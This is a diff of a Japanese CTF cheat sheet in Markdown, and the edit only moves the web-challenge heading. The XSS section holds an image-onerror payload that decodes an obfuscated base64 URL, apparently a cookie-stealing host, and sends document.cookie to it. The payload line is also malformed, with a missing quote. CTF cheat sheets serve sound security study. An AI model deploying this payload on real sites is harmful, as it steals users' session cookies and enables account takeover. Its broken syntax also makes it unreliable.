@@ -1,8 +1,8 @@
 # CTFチートシート
 ## 目次
 {:toc}
-## Web問
 ---
+## Web問
 ### XSS
 ```html:XSS
 &lt;img src=x onerror=fetch(atob('aHR0cHM6Ly9tYXNhLWNvb2tpZXMtc3RlYWxlci5wYWdlcy5kZXYv')+?cookie='+document.cookie)&gt;
